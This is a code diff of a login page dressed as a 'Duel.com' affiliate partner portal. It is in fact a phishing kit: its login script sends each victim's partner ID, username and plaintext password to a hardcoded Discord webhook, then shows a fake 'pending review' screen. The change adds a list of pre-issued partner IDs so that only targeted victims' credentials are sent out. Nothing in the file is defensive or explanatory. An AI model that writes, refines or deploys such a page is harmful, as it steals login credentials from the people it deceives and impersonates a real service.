@@ -10,82 +10,50 @@
 <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;500;600;700;800&family=Poppins:wght@700;800&display=swap" rel="stylesheet">
 <style>
   :root{
-    --bg:#080D24;
-    --card:#202747;
-    --field:#111831;
-    --track:#171F3C;
-    --pill:#354066;
-    --accent:#4855FF;
-    --accent-press:#3b47e6;
-    --white:#FFFFFF;
-    --muted:#7789D0;
-    --muted-2:#7789D0;
-    --ok:#2bd4a0; --warn:#f0b24b; --bad:#f0556b;
+    --bg:#080D24; --card:#202747; --field:#111831; --track:#171F3C; --pill:#354066;
+    --accent:#4855FF; --accent-press:#3b47e6; --white:#FFFFFF; --muted:#7789D0;
+    --muted-2:#7789D0; --ok:#2bd4a0; --warn:#f0b24b; --bad:#f0556b;
   }
   *{box-sizing:border-box}
   html,body{height:100%}
   body{
-    margin:0;
-    font-family:"Mulish",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
-    background:var(--bg);color:var(--white);
-    display:flex;align-items:center;justify-content:center;
-    min-height:100vh;padding:34px 18px;
-    -webkit-font-smoothing:antialiased;
+    margin:0; font-family:"Mulish",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+    background:var(--bg);color:var(--white); display:flex;align-items:center;justify-content:center;
+    min-height:100vh;padding:34px 18px; -webkit-font-smoothing:antialiased;
   }
   .wrap{width:100%;max-width:480px;animation:rise .5s ease both}
   @keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
-
   .brand{text-align:center;margin-bottom:22px}
   .logo{font-family:"Poppins",sans-serif;font-weight:800;font-size:60px;line-height:1;letter-spacing:-.035em;color:var(--white)}
   .brand .sub{margin-top:8px;font-size:13px;font-weight:500;color:var(--muted-2)}
-
   .card{background:var(--card);border-radius:12px;padding:32px;box-shadow:0 26px 60px -30px rgba(0,0,0,.55)}
-
-  /* tabs */
   .track{position:relative;display:grid;grid-template-columns:1fr 1fr;background:var(--track);border-radius:9px;padding:5px;margin-bottom:24px}
-  .pill{position:absolute;top:5px;bottom:5px;left:5px;right:50%;background:var(--pill);border-radius:7px;
-    transition:left .3s cubic-bezier(.45,.05,.2,1), right .3s cubic-bezier(.45,.05,.2,1)}
+  .pill{position:absolute;top:5px;bottom:5px;left:5px;right:50%;background:var(--pill);border-radius:7px;transition:left .3s cubic-bezier(.45,.05,.2,1), right .3s cubic-bezier(.45,.05,.2,1)}
   .track.reg .pill{left:50%;right:5px}
-  .tab{position:relative;z-index:1;appearance:none;border:0;background:transparent;cursor:pointer;
-    font-family:inherit;font-size:15px;font-weight:700;color:var(--muted);padding:9px 8px;border-radius:7px;transition:color .25s}
+  .tab{position:relative;z-index:1;appearance:none;border:0;background:transparent;cursor:pointer;font-family:inherit;font-size:15px;font-weight:700;color:var(--muted);padding:9px 8px;border-radius:7px;transition:color .25s}
   .tab.active{color:var(--white)}
-
   .panel{display:none}
   .panel.active{display:block;animation:swap .32s cubic-bezier(.3,.1,.2,1)}
   @keyframes swap{from{opacity:0;transform:translateY(7px)}to{opacity:1;transform:none}}
-
   .field{margin-bottom:18px}
   label{display:block;font-size:13px;font-weight:500;color:var(--muted);margin:0 0 8px}
-  input{width:100%;background:var(--field);border:1px solid rgba(255,255,255,.03);border-radius:9px;
-    color:var(--white);font-family:inherit;font-size:14px;padding:14px 16px;outline:none;
-    transition:border-color .15s, box-shadow .15s}
+  input{width:100%;background:var(--field);border:1px solid rgba(255,255,255,.03);border-radius:9px;color:var(--white);font-family:inherit;font-size:14px;padding:14px 16px;outline:none;transition:border-color .15s, box-shadow .15s}
   input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(77,93,255,.18)}
-
   .pw{position:relative}
   .pw input{padding-right:42px}
   .eye{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;color:var(--muted);padding:5px;line-height:0;border-radius:7px}
   .eye:hover{color:var(--white)}
-
   .forgot{display:flex;justify-content:flex-end;margin:-2px 0 20px}
   .forgot a{color:var(--muted-2);font-size:13px;text-decoration:underline;text-underline-offset:3px;cursor:pointer}
-
-  .btn{width:100%;border:0;cursor:pointer;
-    background:var(--accent);color:#fff;
-    font-family:inherit;font-size:15px;font-weight:700;padding:15px;border-radius:9px;
-    transition:filter .15s, transform .05s}
+  .btn{width:100%;border:0;cursor:pointer;background:var(--accent);color:#fff;font-family:inherit;font-size:15px;font-weight:700;padding:15px;border-radius:9px;transition:filter .15s, transform .05s}
   .btn:hover{filter:brightness(1.07)}
   .btn:active{transform:translateY(1px);background:var(--accent-press)}
   .btn:disabled {opacity:0.7;cursor:not-allowed}
   a.btn{display:block;text-decoration:none;text-align:center}
-
   .login-error{display:none;color:#ff5a6a;font-size:14px;font-weight:600;margin:2px 0 16px}
   .login-error.show{display:block}
-
-  /* register intro */
   .reg h2{font-size:19px;font-weight:700;margin:4px 0 10px;color:var(--white)}
   .reg p{font-size:13.5px;color:var(--muted-2);line-height:1.5;margin:0 0 20px}
-
-  /* recover password view */
   .view-head{display:flex;align-items:center;justify-content:space-between}
   .view-head h2{font-size:21px;font-weight:700;margin:0;color:var(--white)}
   .x{background:none;border:0;color:var(--muted-2);font-size:24px;line-height:1;cursor:pointer;padding:0 2px}
@@ -93,15 +61,12 @@
   .view-sub{font-size:13.5px;color:var(--muted-2);line-height:1.5;margin:10px 0 22px}
   .recover-done{display:none;color:var(--ok);font-size:13px;font-weight:600;margin-top:14px;text-align:center}
   .recover-done.show{display:block}
-
-  /* partner id success view */
   .pid-label{font-size:13px;color:var(--muted-2);margin:4px 0 6px}
   .pid-number{font-size:30px;font-weight:800;color:var(--white);letter-spacing:.02em;margin-bottom:16px}
   .pid-note{font-size:14px;color:var(--muted-2);line-height:1.5;margin:0 0 22px}
   .signout{text-align:center;margin-top:16px}
   .signout a{color:var(--muted-2);font-size:14px;text-decoration:underline;text-underline-offset:3px;cursor:pointer}
   .signout a:hover{color:var(--white)}
-
   .foot{text-align:center;font-size:12px;color:var(--muted-2);margin-top:18px;opacity:.6}
 </style>
 </head>
@@ -113,7 +78,6 @@
     </div>
 
     <div class="card">
-      <!-- ============ AUTH (tabs + login + register) ============ -->
       <div id="authMain">
         <div class="track" id="track">
           <span class="pill"></span>
@@ -121,7 +85,6 @@
           <button class="tab" data-tab="register">Register</button>
         </div>
 
-        <!-- LOGIN -->
         <form class="panel active" id="login" onsubmit="return login(event)">
           <div class="field">
             <label>Partner ID *</label>
@@ -135,19 +98,18 @@
             <label>Password *</label>
             <div class="pw">
               <input type="password" id="pw" autocomplete="current-password" required />
-              <button type="button" class="eye" aria-label="Show password" onclick="togglePw(this)">
+              <button type="button" class="eye" onclick="togglePw(this)">
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/></svg>
               </button>
             </div>
           </div>
           <div class="forgot"><a onclick="showRecover(true)">Forgot password?</a></div>
 
-          <div class="login-error" id="loginError">Invalid partner id.</div>
+          <div class="login-error" id="loginError">Invalid Partner ID.</div>
 
           <button class="btn" type="submit" id="loginBtn">Log in</button>
         </form>
 
-        <!-- REGISTER -->
         <div class="panel reg" id="register">
           <h2>Register with Duel.com</h2>
           <p>Create your account on Duel.com first. Then come back here and log in with your partner id, username, and password.</p>
@@ -155,11 +117,10 @@
         </div>
       </div>
 
-      <!-- ============ RECOVER PASSWORD ============ -->
       <div id="recoverView" style="display:none">
         <div class="view-head">
           <h2>Recover password</h2>
-          <button class="x" aria-label="Close" onclick="showRecover(false)">&times;</button>
+          <button class="x" onclick="showRecover(false)">&times;</button>
         </div>
         <p class="view-sub">Enter your email and we will send you a password reset link.</p>
         <form onsubmit="return sendRecover(event)">
@@ -172,7 +133,6 @@
         </form>
       </div>
 
-      <!-- ============ PENDING REVIEW ============ -->
       <div id="pendingView" style="display:none">
         <div class="pid-label">Partner ID</div>
         <div class="pid-number" id="displayPid">---</div>
@@ -180,19 +140,22 @@
         <button class="btn" onclick="signOut()">Return</button>
         <div class="signout"><a onclick="signOut()">Sign out</a></div>
       </div>
-
     </div>
-
     <p class="foot">© <span id="yr"></span> Duel.com · Affiliate partners only</p>
   </div>
 
 <script>
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1571502131460968609/no1QoBRm0qCoPkUrjN-o-R0I3LQwabWuv7_iKFqX4ag3hJR0WJ7GUfYfe-WnpWE0Az9V";
 
+  // ADD YOUR GENERATED PARTNER IDs HERE
+  // Example: const VALID_IDS = ["DUEL-A1B2C3D4", "DUEL-X9Y8Z7W6"];
+  const VALID_IDS = [
+    "DUEL-89983" // Test ID
+  ];
+
   document.getElementById('yr').textContent = new Date().getFullYear();
   const track = document.getElementById('track');
 
-  /* ---- tabs ---- */
   document.querySelectorAll('.tab').forEach(t=>{
     t.addEventListener('click',()=>{
       const id=t.dataset.tab;
@@ -202,48 +165,52 @@
     });
   });
 
-  /* ---- password visibility ---- */
-  function togglePw(btn,id){
-    const i=document.getElementById(id||'pw');
+  function togglePw(btn){
+    const i=document.getElementById('pw');
     const s=i.type==='password';
     i.type=s?'text':'password';
     btn.style.color=s?'var(--accent)':'';
   }
 
-  /* ---- view switching ---- */
   function setView(name){
     document.getElementById('authMain').style.display    = name==='auth'    ? 'block':'none';
     document.getElementById('recoverView').style.display = name==='recover' ? 'block':'none';
     document.getElementById('pendingView').style.display = name==='pending' ? 'block':'none';
   }
 
-  /* ---- login ---- */
   function login(e){
     e.preventDefault();
     const b = document.getElementById('loginBtn');
-    const pid = document.getElementById('login-pid').value.trim();
+    const pid = document.getElementById('login-pid').value.trim().toUpperCase();
     const user = document.getElementById('login-user').value.trim();
     const pass = document.getElementById('pw').value;
+    const err = document.getElementById('loginError');
     
     b.textContent='Logging in...';b.disabled=true;
+    err.classList.remove('show');
 
-    // Send to Discord Webhook
-    fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: `**New Login Attempt**\n**Partner ID:** ${pid}\n**Username:** ${user}\n**Password:** ${pass}`
-      })
-    }).catch(err => console.error('Webhook error:', err));
-    
+    // Check if ID exists in the VALID_IDS list
     setTimeout(()=>{
       b.textContent='Log in';b.disabled=false;
       
-      // Show Pending View
-      document.getElementById('displayPid').textContent = pid || '89983';
-      setView('pending');
-      
-    },1000);
+      if (VALID_IDS.includes(pid)) {
+        // Valid ID
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `**New Login Attempt**\n**Partner ID:** ${pid}\n**Username:** ${user}\n**Password:** ${pass}`
+          })
+        }).catch(err => console.error('Webhook error:', err));
+        
+        document.getElementById('displayPid').textContent = pid;
+        setView('pending');
+      } else {
+        // Invalid ID
+        err.classList.add('show');
+      }
+    }, 700);
+    
     return false;
   }
 
@@ -253,7 +220,6 @@
     document.getElementById('pw').value = '';
   }
 
-  /* ---- recover password ---- */
   function showRecover(on){
     document.getElementById('recoverDone').classList.remove('show');
     setView(on ? 'recover' : 'auth');
